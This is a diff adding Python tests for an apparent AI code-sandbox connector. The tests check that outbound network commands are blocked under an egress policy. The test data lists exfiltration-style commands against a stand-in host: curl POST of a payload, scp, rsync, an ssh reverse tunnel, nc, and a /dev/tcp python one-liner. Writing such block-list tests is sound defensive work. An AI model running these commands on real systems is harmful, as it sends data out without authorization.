@@ -39,6 +39,30 @@ def test_get_blocked_package_install_reason_blocks_sudo_commands() -> None:
     assert reason is not None
     assert "sudo" in reason.lower()
 
+def test_get_blocked_package_install_reason_blocks_outbound_network_commands() -> None:
+    commands = [
+        "curl -X POST https://example.com -d @payload.txt",
+        "wget https://example.com/archive.tar.gz",
+        "ftp example.com",
+        "sftp user@example.com",
+        "scp output.txt user@example.com:/tmp",
+        "rsync -avz ./ user@example.com:/tmp/out",
+        "ssh -R 8080:localhost:3000 user@example.com",
+        "nc example.com 9000 < payload.bin",
+        "python3 -c 'import os; os.system(\"cat file > /dev/tcp/example.com/80\")'",
+        "/usr/bin/curl -X POST https://example.com -d @payload.txt",
+        "bash -c \"/usr/bin/wget https://example.com/archive.tar.gz\"",
+    ]
+
+    for command in commands:
+        reason = get_blocked_package_install_reason(command)
+        assert reason is not None
+        assert "<= 1,000,000 bytes external egress policy" in reason
+
+
+def test_get_blocked_package_install_reason_allows_non_network_ssh_utilities() -> None:
+    assert get_blocked_package_install_reason("ssh-keygen -t ed25519 -N '' -f /tmp/id_ed25519") is None
+
 
 @pytest.mark.asyncio
 async def test_execute_action_rejects_package_install_before_sandbox_use() -> None:
@@ -72,5 +96,24 @@ async def test_execute_action_rejects_sudo_before_sandbox_use() -> None:
             "Using sudo inside the code sandbox is disabled. "
             "Run commands without elevated privileges. "
             "Blocked command pattern: sudo."
+        )
+    }
+
+
+@pytest.mark.asyncio
+async def test_execute_action_rejects_outbound_network_command_before_sandbox_use() -> None:
+    connector = CodeSandboxConnector(organization_id="org_123")
+
+    result = await connector.execute_action(
+        "execute_command",
+        {"command": "curl -X POST https://example.com -d @payload.txt", "conversation_id": "conv_123"},
+    )
+
+    assert result == {
+        "error": (
+            "Outbound network transfer commands are disabled in the code sandbox to enforce "
+            "a strict <= 1,000,000 bytes external egress policy. "
+            "FTP/tunneling and similar exfiltration channels are blocked. "
+            "Blocked command pattern: curl."
         )
     }
